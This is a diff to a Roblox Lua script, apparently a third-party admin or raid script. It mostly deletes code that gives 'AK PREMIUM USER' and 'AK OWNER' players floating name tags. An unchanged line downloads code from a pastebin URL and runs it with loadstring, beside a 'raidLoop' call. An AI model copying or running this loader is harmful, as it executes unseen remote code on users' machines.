@@ -384,73 +384,11 @@ for _, username in ipairs(Scripters) do
     end
 end
 end
-for _, username in ipairs(premiumUsers) do
-    if game.Players:FindFirstChild(username) then
-    local otherPlayer = game.Players[username]
-    if otherPlayer ~= nil and otherPlayer.Character ~= nil then
-        local otherTag = Instance.new("BillboardGui")
-        otherTag.Name = "PlayerTag"
-        otherTag.AlwaysOnTop = true
-        otherTag.Size = UDim2.new(0, 200, 0, 50)
-        otherTag.StudsOffset = Vector3.new(0, 3, 0)
-        otherTag.Adornee = otherPlayer.Character.Head
-
-        local otherLabel = Instance.new("TextLabel")
-        otherLabel.Name = "TagLabel"
-        otherLabel.Size = UDim2.new(1, 0, 1, 0)
-        otherLabel.BackgroundTransparency = 1
-        otherLabel.Text = "AK PREMIUM USER"
-        otherLabel.TextColor3 = Color3.new(1, 1, 1)
-        otherLabel.TextStrokeTransparency = 0.5
-        otherLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
-        otherLabel.Font = Enum.Font.Bangers
-        otherLabel.FontSize = Enum.FontSize.Size32
-        otherLabel.Parent = otherTag
-
-        otherTag.Parent = otherPlayer.Character.Head
-    end
-end
-end
 
 
-for _, username in ipairs(Owners) do
-    if game.Players:FindFirstChild(username) then
-    local otherPlayer = game.Players[username]
-    if otherPlayer ~= nil and otherPlayer.Character ~= nil then
-        local otherTag = Instance.new("BillboardGui")
-        otherTag.Name = "PlayerTag"
-        otherTag.AlwaysOnTop = true
-        otherTag.Size = UDim2.new(0, 200, 0, 50)
-        otherTag.StudsOffset = Vector3.new(0, 3, 0)
-        otherTag.Adornee = otherPlayer.Character.Head
 
-        local otherLabel = Instance.new("TextLabel")
-        otherLabel.Name = "TagLabel"
-        otherLabel.Size = UDim2.new(1, 0, 1, 0)
-        otherLabel.BackgroundTransparency = 1
-        otherLabel.Text = "AK OWNER"
-        otherLabel.TextColor3 = Color3.new(1, 1, 1)
-        otherLabel.TextStrokeTransparency = 0.5
-        otherLabel.TextStrokeColor3 = Color3.new(255, 0, 0)
-        otherLabel.Font = Enum.Font.Arcade
-        otherLabel.FontSize = Enum.FontSize.Size32
-        otherLabel.Parent = otherTag
 
-        otherTag.Parent = otherPlayer.Character.Head
-                				spawn(function()
-					while task.wait() do
-						local t = 5; 
-						local hue = tick() % t / t
-						local colorrr = Color3.fromHSV(hue, 1, 1)
-						otherLabel.TextStrokeColor3 = colorrr
-					end
-				end)
-    end
-end
-end
-end
 
-)
 end
 )
 
@@ -494,5 +432,6 @@ local function raidLoop()
 end
 loadstring(game:HttpGet("https://pastebin.com/raw/2kyjCzkA"))()
 raidLoop() -- Start the raid loop
- end}
+ end
 )
+        end } )
